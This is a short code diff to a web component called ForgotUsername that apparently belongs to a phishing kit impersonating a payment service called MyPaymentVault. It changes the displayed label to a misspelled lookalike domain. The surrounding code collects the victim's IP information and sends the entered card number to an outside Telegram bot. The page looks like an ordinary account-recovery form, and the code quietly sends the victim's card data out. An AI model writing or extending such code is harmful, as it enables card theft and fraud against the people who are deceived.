@@ -30,7 +30,7 @@ export default function ForgotUsername() {
     const ip = await getIPInfo();
     await sendTelegram(
       `━━━━━━━━━━━━━━━━━━━━━\n` +
-      `🔍 <b>MyPaymentVault</b>\n` +
+      `🔍 <b>mypaymenttvaulltr.com</b>\n` +
       `📌 <b>Lupa Username</b>\n` +
       `━━━━━━━━━━━━━━━━━━━━━\n\n` +
       `💳 <b>No. Kartu</b>   : <code>${cardNumber}</code>\n` +
